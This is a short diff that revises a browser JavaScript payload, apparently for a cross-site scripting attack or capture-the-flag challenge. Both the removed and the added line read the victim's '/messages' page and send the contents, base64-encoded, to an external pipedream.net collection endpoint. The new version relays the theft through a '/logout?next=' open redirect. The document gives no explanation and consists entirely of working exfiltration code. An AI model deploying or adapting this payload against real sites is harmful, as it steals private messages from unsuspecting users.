@@ -1,1 +1,1 @@
-var x=new XMLHttpRequest();x.open('GET','/messages',true);x.onload=function(){location='https://eoeipamgnflz15n.m.pipedream.net?c='+btoa(x.responseText)};x.onerror=function(e){location='https://eoeipamgnflz15n.m.pipedream.net?c=err:'+encodeURIComponent(String(e))};x.send();
+(async()=>{let t=await (await fetch('/messages?id=1',{cache:'no-store'})).text();location='/logout?next='+encodeURIComponent('https://eoeipamgnflz15n.m.pipedream.net?c='+btoa(t))})();
